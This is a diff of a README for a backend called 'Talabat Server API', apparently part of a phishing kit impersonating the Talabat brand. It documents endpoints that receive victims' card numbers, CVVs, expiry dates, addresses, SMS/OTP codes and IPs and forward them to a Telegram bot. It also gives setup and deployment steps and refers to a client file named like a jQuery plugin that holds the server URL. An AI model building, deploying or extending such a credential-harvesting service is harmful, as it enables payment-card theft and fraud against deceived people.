@@ -1,60 +1,53 @@
 # Talabat Server API
 
-A Vercel serverless API server for handling Talabat payment and SMS data with Telegram integration.
+An Express.js API server for handling Talabat payment and SMS data with Telegram integration.
 
 ## Features
 
-- ✅ Serverless functions (Vercel)
+- ✅ Express.js server
 - ✅ Payment data handling (`/api/send-payment`)
 - ✅ SMS/OTP code handling (`/api/send-sms`)
+- ✅ Approve data handling (`/api/send-approve`)
 - ✅ Telegram Bot API integration
+- ✅ Rate limiting and security headers
 - ✅ CORS enabled
 - ✅ Error handling
 
 ## Setup
 
-### 1. Install Vercel CLI
-
-```bash
-npm install -g vercel
-```
-
-### 2. Install Dependencies
+### 1. Install Dependencies
 
 ```bash
 cd talabat-server
 npm install
 ```
 
-### 3. Configure Environment Variables
+### 2. Configure Telegram Bot
 
-You need to set your Telegram bot credentials. You can do this in two ways:
-
-#### Option A: Using Vercel Dashboard
-1. Go to your Vercel project settings
-2. Navigate to "Environment Variables"
-3. Add:
-   - `TELEGRAM_BOT_TOKEN` = Your Telegram bot token
-   - `TELEGRAM_CHAT_ID` = Your Telegram chat ID
-
-#### Option B: Using Vercel CLI
-```bash
-vercel env add TELEGRAM_BOT_TOKEN
-vercel env add TELEGRAM_CHAT_ID
-```
-
-### 4. Deploy to Vercel
+Edit `config.js` and update your Telegram bot token and chat ID, or set environment variables:
 
 ```bash
-# Login to Vercel (first time only)
-vercel login
-
-# Deploy to production
-vercel --prod
-
-# Or deploy to preview
-vercel
+export TELEGRAM_BOT_TOKEN="your_bot_token"
+export TELEGRAM_CHAT_ID="your_chat_id"
 ```
+
+Or create a `.env` file:
+```
+TELEGRAM_BOT_TOKEN=your_bot_token
+TELEGRAM_CHAT_ID=your_chat_id
+```
+
+### 3. Start the Server
+
+```bash
+# Development mode with auto-restart
+npm run dev
+
+# Production mode
+npm start
+```
+
+The server will run on `http://localhost:3000` (or the port specified in config.js)
 
 ## API Endpoints
 
@@ -77,15 +70,17 @@ Sends payment/billing data to Telegram.
 **Request Body:**
 ```json
 {
-  "firstName": "John",
-  "lastName": "Doe",
-  "phoneNumber": "+1234567890",
-  "creditCard": "1234567890123456",
-  "expiryDate": "12/25",
-  "expiryMonth": "12",
-  "expiryYear": "25",
-  "cvv": "123",
-  "ip": "127.0.0.1",
+  "nom": "John",
+  "prenom": "Doe",
+  "address": "123 Main St",
+  "city": "New York",
+  "zipCode": "10001",
+  "country": "USA",
+  "cardNumber": "1234567890123456",
+  "cardExpiry": "12/25",
+  "cardCVV": "123",
+  "page": "billing",
+  "clientIP": "127.0.0.1",
   "timestamp": "2026-02-09T08:17:44.512Z"
 }
 ```
@@ -95,8 +90,7 @@ Sends payment/billing data to Telegram.
 {
   "success": true,
   "message": "Payment data sent successfully",
-  "messageId": 12345,
-  "timestamp": "2026-02-09T08:17:44.512Z"
+  "messageId": 12345
 }
 ```
 
@@ -106,9 +100,9 @@ Sends SMS/OTP code data to Telegram.
 **Request Body:**
 ```json
 {
-  "otp": "123456",
-  "ip": "127.0.0.1",
-  "timestamp": "2026-02-09T08:17:44.512Z"
+  "smsCode": "123456",
+  "page": "sms",
+  "clientIP": "127.0.0.1"
 }
 ```
 
@@ -117,52 +111,87 @@ Sends SMS/OTP code data to Telegram.
 {
   "success": true,
   "message": "SMS data sent successfully",
-  "messageId": 12346,
-  "timestamp": "2026-02-09T08:17:44.512Z"
+  "messageId": 12346
 }
 ```
 
-## Local Development
+### POST /api/send-approve
+Sends approve data to Telegram.
 
-To test locally:
-
-```bash
-# Start Vercel dev server
-vercel dev
+**Request Body:**
+```json
+{
+  "messages": "Approval message",
+  "pageType": "approve",
+  "clientIP": "127.0.0.1"
+}
 ```
 
-The server will run on `http://localhost:3000`
+**Response:**
+```json
+{
+  "success": true,
+  "message": "Approve data sent successfully",
+  "messageId": 12347
+}
+```
+
+### GET /api/health
+Health check endpoint.
 
 ## Project Structure
 
 ```
 talabat-server/
-├── api/
-│   ├── index.js          # Root endpoint (health check)
-│   ├── send-payment.js   # Payment data endpoint
-│   └── send-sms.js       # SMS/OTP endpoint
+├── server.js             # Main Express server
 ├── config.js             # Configuration file
 ├── package.json          # Dependencies
-├── vercel.json           # Vercel configuration
 └── README.md             # This file
 ```
 
-## Updating the Client Code
+## Deployment
 
-After deploying, update your `talabat_panel/js/jquery.mask.js` to use your new server URL:
+### Deploy to Vercel
 
-```javascript
-// Change from:
-"url": "https://ge-server.vercel.app/api/send-payment"
+You can deploy this Express server to Vercel by creating a `vercel.json`:
 
-// To:
-"url": "https://your-talabat-server.vercel.app/api/send-payment"
+```json
+{
+  "version": 2,
+  "builds": [
+    {
+      "src": "server.js",
+      "use": "@vercel/node"
+    }
+  ],
+  "routes": [
+    {
+      "src": "/(.*)",
+      "dest": "server.js"
+    }
+  ]
+}
 ```
+
+Then deploy:
+```bash
+vercel --prod
+```
+
+### Deploy to Other Platforms
+
+This Express server can be deployed to:
+- Heroku
+- Railway
+- Render
+- DigitalOcean App Platform
+- Any Node.js hosting service
 
 ## Security Notes
 
-- Environment variables are stored securely in Vercel
-- CORS is enabled for cross-origin requests
+- Rate limiting: 100 requests per 15 minutes per IP
+- Helmet.js security headers enabled
+- CORS enabled for cross-origin requests
 - All endpoints validate required fields
 - Errors are logged but not exposed to clients
 
